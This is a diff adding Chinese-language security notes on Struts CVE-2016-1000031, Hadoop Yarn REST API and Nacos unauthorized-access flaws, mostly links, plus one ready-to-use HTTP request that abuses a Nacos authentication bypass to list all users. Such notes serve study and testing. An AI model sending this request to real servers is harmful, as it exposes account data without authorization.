@@ -116,3 +116,35 @@ Windows Server 2003
 
 Windows XP
 
+# Struts 远程代码执行漏洞(CVE-2016-1000031)
+
+Struts2 是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。 
+Apache Struts 2.3.36及之前的版本使用了Commons FileUpload 1.3.2及以下版本，该库作为Struts2的一部分，被用作文件上传的默认机制，该上传机制存在一个高危漏洞，远程攻击者可以利用该漏洞获得远程代码执行能力。
+
+https://www.zerodayinitiative.com/advisories/ZDI-16-570/
+
+https://www.cnblogs.com/peace-and-romance/p/15652512.html
+
+# Hadoop Yarn REST API 未授权漏洞
+
+https://developer.aliyun.com/article/824738
+
+# Nacos 未授权漏洞复现
+
+[Nacos 未授权漏洞复现
+](https://www.programminghunter.com/article/25592048521/)
+```dotnetcli
+get方式获得其他用户信息：
+
+GET /nacos/v1/auth/users?pageNo=1&pageSize=999 HTTP/1.1
+Host: XXX
+User-Agent: Nacos-Server
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Language: zh-CN,zh;q=0.9
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Upgrade-Insecure-Requests: 1
+Accept-Encoding: gzip
+```
